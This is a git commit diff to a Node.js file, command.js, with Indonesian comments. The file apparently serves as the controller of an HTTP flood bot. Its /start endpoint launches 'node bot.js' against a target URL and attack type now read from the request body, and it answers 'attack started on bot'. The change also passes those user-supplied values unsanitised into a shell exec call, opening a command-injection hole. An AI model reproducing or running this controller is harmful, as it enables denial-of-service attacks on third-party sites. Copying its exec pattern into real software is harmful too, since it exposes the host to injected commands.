dc92fa5348fa9e47cabf718885384e77ee34f530
Brex666 <127381583+brxzzyall@users.noreply.github.com>
2025-10-29 05:11:21 +0700

    Update command.js

--- command.js
+++ command.js
@@ -2,21 +2,26 @@ const http = require('http');
 const { exec } = require('child_process');
 
 const PORT = 3000;
-const TARGET_URL = 'https://example.com'; // Atur URL target Anda di sini
-const ATTACK_TYPE = 'GET'; // 'GET', 'POST', 'HEAD', dst.
 
 http.createServer((req, res) => {
     if (req.method === 'POST' && req.url === '/start') {
-        exec(`TARGET_URL=${TARGET_URL} ATTACK_TYPE=${ATTACK_TYPE} node bot.js`, (error, stdout, stderr) => {
-            if (error) {
-                console.error(`Kesalahan exec: ${error}`);
-                return;
-            }
-            console.log(`Stdout: ${stdout}`);
-            console.error(`Stderr: ${stderr}`);
+        let body = '';
+        req.on('data', chunk => {
+            body += chunk.toString();
         });
-        res.writeHead(200, { 'Content-Type': 'text/plain' });
-        res.end('Serangan dimulai pada bot\n');
+        req.on('end', () => {
+            const { targetURL, attackType } = JSON.parse(body);
+            exec(`TARGET_URL=${targetURL} ATTACK_TYPE=${attackType} node bot.js`, (error, stdout, stderr) => {
+                if (error) {
+                    console.error(`Kesalahan exec: ${error}`);
+                    return;
+                }
+                console.log(`Stdout: ${stdout}`);
+                console.error(`Stderr: ${stderr}`);
+            });
+            res.writeHead(200, { 'Content-Type': 'text/plain' });
+            res.end('Serangan dimulai pada bot\n');
+        });
     } else if (req.method === 'POST' && req.url === '/stop') {
         // Implementasi perintah stop jika diperlukan
         res.writeHead(200, { 'Content-Type': 'text/plain' });
